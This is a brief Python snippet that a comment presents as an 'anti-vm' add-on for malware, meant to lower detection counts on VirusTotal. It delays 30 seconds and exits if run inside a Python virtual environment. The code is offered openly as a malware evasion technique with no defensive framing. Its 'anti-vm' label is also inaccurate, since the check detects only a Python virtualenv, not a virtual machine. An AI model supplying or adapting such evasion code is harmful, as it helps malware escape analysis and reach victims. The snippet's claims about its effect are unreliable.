# adding this snippet of code to the beggining of your malware will decrease the amount of positives on Virustotal
# anti-vm made by @ItsChasa

import time
import sys

time.sleep(30)

def get_base_prefix_compat():
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix
def in_virtualenv(): 
    return get_base_prefix_compat() != sys.prefix
if in_virtualenv() == True:
    sys.exit()
